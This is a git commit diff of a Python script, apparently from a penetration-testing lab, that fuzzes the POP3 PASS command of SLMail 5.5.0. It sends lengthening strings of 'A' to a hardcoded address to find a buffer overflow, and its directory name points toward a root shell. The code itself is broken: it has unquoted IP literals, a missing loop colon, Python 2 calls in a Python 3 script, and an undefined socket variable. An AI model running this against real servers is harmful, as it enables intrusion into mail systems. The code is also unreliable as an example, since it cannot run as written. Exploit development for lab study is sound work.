feb6592cc0dea9d4c0a124accd59d3e785137860
Devin Trejo <dtrejod@gmail.com>
2016-04-08 10:36:52 -0400

    Upload python script
    - Didn't commit on last upload..

--- projects/20160407_slmail_rootshell_bufferoveflow/slmail_buffer_overflow.py
+++ projects/20160407_slmail_rootshell_bufferoveflow/slmail_buffer_overflow.py
@@ -1,38 +1,56 @@
 #!/usr/bin/env python3
-import socket, sys, os
 
+# 
+# Exploits buffer overflow for SLMail-5.5.0 over POP3 protocol
+#
+# Author: Devin Trejo
+# Date: 20160408
+
+import socket, sys, os
 
 def main():
     # Client machine IPv4 address
-    #
-    clientIP = 10.10.10.102
-    clinetPORT = 25
+    clientIP = 192.168.56.105
+    clinetPORT = 110
+
+    # Maximum size of PASS buffer sized passed to POP3 server
+    MAX_PASS_BUFFER_LEN = 1000
 
     # Declare a acceptable buffer size that fits into TCP Packet
-    #
     BUFFER_SIZE = 1024
 
     # Create a new socket to the server
-    #
     serverSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    # Try to connect to passed IP
+    # Define Static username to pass into POP3 protocol USER prompt
     #
-    try:
-        s.connect((clientIP, clinetPORT))
-    except Exception:
-        s.close()
-        return -1
+    USER = "user"
 
     # Check to see if the a name exists on the remote machine
-    #
-    for userEmail in listEmails:
-        msgCmd = "220 " + username + " ESMTP"
+    for i in xrange(0,MAX_PASS_BUFFER_LEN)
+        # Try to connect to passed IP
+        try:
+            s.connect((clientIP, clinetPORT))
+        except Exception:
+            print("\n\nConnection could not be made to server.")
+            s.close()
+            return -1
 
-        s.send(bytes(msgCmd, 'UTF-8'))
+        # Print for debug to console the length of password buffer
+        print("\n\nTesting Password Buffer Size i =" + str(i))
 
+        # Send server username
+        s.send(bytes("USER " + USER + "\r\n", 'UTF-8'))
+        
         # Wait to receive a message
         data = s.recv(BUFFER_SIZE)
         data =  bytes.decode(data, 'UTF-8')
         print("Received data: \n" + data)
 
+        # Send server password (with long string of A times i)
+        s.send(bytes("PASS " + "A"*i + "\r\n"))
+
+        # Wait to receive a message
+        data = s.recv(BUFFER_SIZE)
+        data =  bytes.decode(data, 'UTF-8')
+        print("Received data: \n" + data)
